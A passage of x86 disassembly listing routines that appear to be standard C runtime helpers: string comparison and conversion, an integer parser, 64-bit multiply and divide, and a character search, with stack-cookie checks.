  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
